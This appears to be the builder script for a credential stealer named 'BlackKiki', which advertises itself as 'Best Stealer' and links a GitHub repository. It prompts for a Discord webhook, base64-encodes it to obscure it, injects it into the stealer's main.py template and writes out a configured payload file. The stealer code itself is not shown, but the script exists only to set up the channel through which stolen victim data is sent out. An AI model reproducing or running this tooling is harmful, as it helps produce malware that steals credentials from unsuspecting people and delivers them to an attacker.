import base64
banner = f"""
 ____  _        _    ____ _  __     _  _____ _  _____ 
| __ )| |      / \  / ___| |/ /    | |/ /_ _| |/ /_ _|
|  _ \| |     / _ \| |   | ' /     | ' / | || ' / | | 
| |_) | |___ / ___ \ |___| . \     | . \ | || . \ | | 
|____/|_____/_/   \_\____|_|\_\    |_|\_\___|_|\_\___|
                Best Stealer OAT
         https://github.com/rp9y/BlackKiki
______________________________________________________

"""

w=input("Enter your Discord Webhook > ").strip()
e=base64.b64encode(w.encode()).decode()

with open("main.py","r",encoding="utf-8") as f:c=f.read()
c=c.replace('YOUR_BASE64_ENCODED_DISCORD_WEBHOOK',e)

with open("BlackKiki_OUTPUT.py","w",encoding="utf-8") as f:f.write(c)
print("Output saved to >> BlackKiki_OUTPUT.py")
